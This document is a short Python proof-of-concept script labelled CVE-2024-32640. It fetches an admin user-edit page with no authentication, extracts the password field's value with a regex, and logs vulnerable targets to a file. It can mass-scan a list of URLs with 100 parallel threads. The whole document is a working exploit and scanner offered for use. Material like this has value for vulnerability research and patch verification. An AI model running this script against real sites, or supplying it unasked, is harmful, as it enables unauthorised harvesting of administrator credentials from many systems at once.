import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "keep-alive"}
    url_payload = '/admin/cascade_/user_edit.action?id=1'
    url = target+url_payload
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.get(url=url,headers=headers,verify=False)
        re1 = re.findall('''fieldPass">\n\t\t\t\t\t\t\t\t\t\t<input value="(.*?)" type="password" name="userBean.loginP''',res2.text,re.S)
        if len(re1[0]) >=10:
            print(f'[+]{target}存在信息泄露')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在信息泄露')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
def main():

    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()